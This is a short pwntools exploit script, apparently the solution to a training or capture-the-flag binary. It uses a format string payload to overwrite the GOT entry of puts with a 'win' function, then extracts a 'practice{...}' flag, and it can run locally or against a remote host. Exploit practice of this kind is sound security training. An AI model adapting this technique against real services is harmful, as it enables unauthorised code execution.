#!/usr/bin/env python3
import re
from pwn import *

context.binary = elf = ELF("./build/got_overwrite_exit", checksec=False)
context.log_level = "info"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process(elf.path, stdin=PIPE, stdout=PIPE)

puts_got = elf.got["puts"]
win = elf.symbols["win"]

# For this binary stack layout, first user-controlled arg is usually offset 6.
payload = fmtstr_payload(6, {puts_got: win}, write_size="short")

io.sendlineafter(b"Input your nickname:\n", payload)
out = io.recvall(timeout=2)

m = re.search(rb"practice\{[^\n\r]+\}", out)
if m:
    print(m.group(0).decode(errors="ignore"))
else:
    print(out.decode(errors="ignore"))
